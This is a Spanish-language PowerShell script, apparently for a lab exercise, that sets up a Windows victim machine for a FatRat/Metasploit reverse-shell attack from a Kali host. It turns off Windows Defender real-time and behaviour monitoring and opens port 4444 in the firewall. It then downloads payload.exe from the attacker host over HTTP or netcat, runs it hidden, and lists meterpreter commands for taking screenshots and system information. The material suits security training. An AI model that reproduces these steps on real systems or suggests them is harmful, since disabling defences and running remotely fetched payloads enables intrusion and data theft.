#Requires -RunAsAdministrator
<#
.SYNOPSIS
    LADO VICTIMA - Windows Bokul (192.168.163.130)
    Ejecutar DESPUES de iniciar el script en Kali Itmar
.NOTES
    PowerShell como ADMINISTRADOR
    Kali Itmar: 192.168.163.129
#>

$KALI_IP   = "192.168.163.129"
$LPORT     = "4444"
$PAYLOAD   = "payload.exe"
$PAYLOAD_DIR = "C:\payloads"
$LOG       = "$env:TEMP\ataque-bokul.log"
$CAPTURAS  = "C:\capturas-bokul"

mkdir $CAPTURAS -Force -EA 0 | Out-Null

function Log   { param($M) "$(Get-Date -Format 'HH:mm:ss') | $M" | Out-File $LOG -Append; Write-Host "[*] $M" }
function OK    { param($M) Write-Host "[✓] $M" -ForegroundColor Green; Log $M }
function CAP   { param($N,$M) Write-Host "`n[📸 CAPTURA $N] $M" -ForegroundColor Yellow }
function PAUSA { Write-Host "`nPresiona ENTER para continuar..." -ForegroundColor Yellow; Read-Host | Out-Null }

Clear-Host
Write-Host @"
╔══════════════════════════════════════════════════╗
║   WINDOWS BOKUL - LADO VICTIMA                  ║
║   Objetivo: Recibir ataque desde Kali Itmar     ║
╚══════════════════════════════════════════════════╝

  Kali Itmar:      $KALI_IP
  Tu IP:           192.168.163.130
  Puerto:          $LPORT
  Log:             $LOG
"@

Write-Host "`nPresiona ENTER para empezar..." -ForegroundColor Green
Read-Host | Out-Null
Clear-Host

# =============================================================
# PASO 1: VERIFICAR CONEXION
# =============================================================
Write-Host "══════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "  [1] Verificando conexion con Kali Itmar" -ForegroundColor Cyan
Write-Host "══════════════════════════════════════════════" -ForegroundColor Cyan

CAP 1 "IP de Windows Bokul"
ipconfig | findstr IPv4
PAUSA

CAP 2 "Ping a Kali Itmar"
ping -n 2 $KALI_IP
PAUSA

# =============================================================
# PASO 2: DESACTIVAR DEFENDER
# =============================================================
Write-Host "══════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "  [2] Desactivando Defender (SOLO LAB!)" -ForegroundColor Cyan
Write-Host "══════════════════════════════════════════════" -ForegroundColor Cyan

CAP 3 "Estado actual de Defender"
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableBlockAtFirstSeen

Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

OK "Defender desactivado"
PAUSA

# =============================================================
# PASO 3: ABRIR PUERTO EN FIREWALL
# =============================================================
Write-Host "══════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "  [3] Abriendo puerto $LPORT en firewall" -ForegroundColor Cyan
Write-Host "══════════════════════════════════════════════" -ForegroundColor Cyan

New-NetFirewallRule -DisplayName "LAB-FatRat-In" -Direction Inbound -Protocol TCP -LocalPort $LPORT -Action Allow -ErrorAction SilentlyContinue | Out-Null
New-NetFirewallRule -DisplayName "LAB-FatRat-Out" -Direction Outbound -Protocol TCP -LocalPort $LPORT -Action Allow -ErrorAction SilentlyContinue | Out-Null

CAP 4 "Reglas de firewall creadas"
Get-NetFirewallRule -DisplayName "LAB-FatRat*" | Format-Table DisplayName, Direction, Enabled, Action
PAUSA

# =============================================================
# PASO 4: CREAR DIRECTORIO Y DESCARGAR PAYLOAD
# =============================================================
Write-Host "══════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "  [4] Descargando payload desde Kali Itmar" -ForegroundColor Cyan
Write-Host "══════════════════════════════════════════════" -ForegroundColor Cyan

mkdir $PAYLOAD_DIR -Force -EA 0 | Out-Null

CAP 5 "Descargando payload.exe"
$URL = "http://$KALI_IP`:8000/payload.exe"
try {
    Invoke-WebRequest -Uri $URL -OutFile "$PAYLOAD_DIR\payload.exe" -UseBasicParsing
    OK "Payload descargado de $URL"
} catch {
    Write-Host "[!] Fallo HTTP. Intentando netcat..." -ForegroundColor Yellow
    Write-Host "En Kali, ejecuta: nc -lvp 9999 < ~/payloads/payload.exe" -ForegroundColor Yellow
    Write-Host "Luego en otra terminal Windows ejecuta:" -ForegroundColor Yellow
    Write-Host "  netcat $KALI_IP 9999 > $PAYLOAD_DIR\payload.exe" -ForegroundColor Yellow
}

CAP 6 "Verificar payload"
if (Test-Path "$PAYLOAD_DIR\payload.exe") {
    Get-ChildItem "$PAYLOAD_DIR\payload.exe"
    OK "Payload listo para ejecutar"
} else {
    Write-Host "[!] Payload no encontrado. Revisa conexion." -ForegroundColor Red
}
PAUSA

# =============================================================
# PASO 5: EJECUTAR PAYLOAD
# =============================================================
Write-Host "══════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "  [5] Ejecutando payload" -ForegroundColor Cyan
Write-Host "══════════════════════════════════════════════" -ForegroundColor Cyan

CAP 7 "Ejecutando payload.exe"
Write-Host "Ejecutando: $PAYLOAD_DIR\payload.exe" -ForegroundColor Yellow
Write-Host "Esto se abre y cierra en 1 segundo - es NORMAL" -ForegroundColor Yellow
Write-Host "La conexion se ve desde Kali en el listener" -ForegroundColor Yellow
Write-Host ""

Start-Process -FilePath "$PAYLOAD_DIR\payload.exe" -WindowStyle Hidden

OK "Payload ejecutado"
PAUSA

# =============================================================
# PASO 6: VERIFICAR CONEXION
# =============================================================
Write-Host "══════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "  [6] Verificando conexion con Kali" -ForegroundColor Cyan
Write-Host "══════════════════════════════════════════════" -ForegroundColor Cyan

Start-Sleep -Seconds 3

CAP 8 "Conexion establecida con Kali"
netstat -an | findstr "4444"
PAUSA

CAP 9 "Proceso payload.exe corriendo"
Get-Process -Name "payload" -ErrorAction SilentlyContinue | Format-Table Id, ProcessName, CPU, PM, StartTime -AutoSize
if (-not (Get-Process -Name "payload" -EA 0)) {
    Write-Host "[!] El proceso payload.exe ya termino (normal - ya conecto)" -ForegroundColor Yellow
    Write-Host "    Verifica la sesion en el listener de Kali" -ForegroundColor Yellow
}
PAUSA

# =============================================================
# PASO 7: RESUMEN
# =============================================================
Write-Host @"

═══════════════════════════════════════════════════
  WINDOWS BOKUL - PROCESO COMPLETADO
═══════════════════════════════════════════════════

📌 Resumen:
  Tu IP:            192.168.163.130
  Kali Itmar:       $KALI_IP
  Payload:          $PAYLOAD_DIR\payload.exe
  Estado:           CONECTADO a Kali Itmar
  Log:              $LOG
  Capturas:         $CAPTURAS

📸 Capturas tomadas en esta maquina:
  1. IP de Windows
  2. Ping a Kali
  3. Defender desactivado
  4. Firewall configurado
  5. Payload descargado
  6. Payload verificado
  7. Ejecutando payload
  8. Conexion activa (netstat)
  9. Proceso payload

🔄 Para verificar desde Kali:
  msfconsole -q -r \\$KALI_IP\tmp\listener-fatrat.rc
  sessions -i 1
  sysinfo
  getuid
  screenshot

"@ -ForegroundColor Green

PAUSA
